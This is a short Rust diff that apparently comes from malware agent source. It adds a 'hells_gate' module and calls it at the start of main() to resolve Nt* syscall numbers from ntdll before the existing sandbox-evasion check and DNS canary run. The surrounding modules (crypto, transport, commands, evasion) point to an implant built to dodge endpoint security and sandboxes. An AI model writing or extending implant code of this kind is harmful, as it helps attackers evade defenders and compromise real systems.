@@ -5,6 +5,7 @@ mod config {
 }
 mod crypto;
 mod transport;
+mod hells_gate;
 mod commands;
 mod evasion;
 
@@ -31,6 +32,9 @@ fn sleep_ms() -> u64 {
 }
 
 fn main() {
+    // Resolve Nt* SSNs from ntdll before any evasion or sleep calls.
+    hells_gate::init();
+
     // Evasion: exit silently if running in a sandbox, then fire DNS canary
     evasion::sandbox_check();
     if !config::CANARY_DOMAIN.is_empty() {
